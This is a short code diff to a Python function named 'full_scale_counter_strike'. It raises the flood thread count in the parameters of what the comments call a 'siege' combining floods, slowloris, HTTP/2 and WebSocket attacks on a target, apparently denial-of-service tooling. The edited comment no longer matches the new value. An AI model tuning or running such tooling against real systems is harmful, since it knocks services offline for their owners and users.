@@ -282,7 +282,7 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
 
     # --- REVISED, more realistic parameters for the siege ---
     params = {
-        "threads": 80,  # Drastically reduced for floods
+        "threads": 120,  # Drastically reduced for floods
         "slowloris_sockets": 150,  # Still high, as these are lightweight
         "h2_threads": 20,  # Still very effective with fewer threads
         "websocket_sockets": 150,  # NEW: Sockets for WebSocket attack
